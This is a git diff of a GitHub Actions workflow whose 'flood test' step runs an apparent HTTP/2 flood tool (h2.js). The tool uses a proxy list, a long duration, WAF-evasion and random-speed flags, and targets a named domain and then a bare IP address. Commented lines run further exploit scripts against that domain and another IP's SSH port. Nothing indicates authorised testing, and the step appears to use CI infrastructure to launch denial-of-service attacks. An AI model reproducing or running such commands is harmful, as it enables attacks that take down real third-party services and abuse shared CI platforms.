@@ -16,7 +16,7 @@ jobs:
       # 只要阈值不满足，这一步会返回非 0，GitHub 自动标记为 failed
       - name: Run flood test (quiet)
         run: |
-          node h2.js https://paper2galgame.com cc.txt 21000 80 2 4 GET --waf --mode full --random-speed --auto-switch
+          node h2.js http://38.55.196.88 cc.txt 21000 80 2 4 GET --waf --mode full --random-speed --auto-switch
           # python3 exploit-test.py paper2galgame.com 443
           # sudo python 12.py paper2galgame.com 443
           # python3 15.py 103.116.247.42 22 300
